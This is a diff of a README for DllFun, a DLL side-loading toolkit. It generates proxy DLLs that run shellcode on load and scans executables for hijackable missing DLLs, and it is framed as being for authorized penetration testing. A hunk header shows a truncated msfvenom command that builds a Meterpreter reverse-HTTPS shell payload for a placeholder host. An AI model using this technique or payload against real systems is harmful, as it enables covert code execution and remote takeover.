@@ -1,6 +1,8 @@
 # DllFun
 
-A Python utility for generating proxy DLL source code for DLL side-loading research and vulnerability proof-of-concept development. Given an original DLL and a raw shellcode binary, it parses the DLL's export table and produces a ready-to-compile C++ source file that forwards all exports to the original DLL while executing arbitrary shellcode on load.
+`dllfun.py` is a Python utility for generating proxy DLL source code for DLL side-loading research and vulnerability proof-of-concept development. Given an original DLL and a raw shellcode binary, it parses the DLL's export table and produces a ready-to-compile C++ source file that forwards all exports to the original DLL while executing arbitrary shellcode on load. 
+
+`check_dll.py` is a Python utility that scans a single .exe or .msi for potentially hijackable missing DLLs in writable paths, prints findings to stdout, and logs CSV results to a per-target file.
 
 > **Intended for authorized security research, penetration testing, and CVE proof-of-concept development only.**
 
@@ -137,7 +139,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thre
 
 ## Finding vulnerable target executables
 
-check_dll.py scans a single .exe or .msi for potentially hijackable missing DLLs in writable paths, prints findings to stdout, and logs CSV results to a per-target file:
+`check_dll.py` scans a single .exe or .msi for potentially hijackable missing DLLs in writable paths, prints findings to stdout, and logs CSV results to a per-target file:
 ```
 D:\>python check_dll.py targets\some-program.exe
 
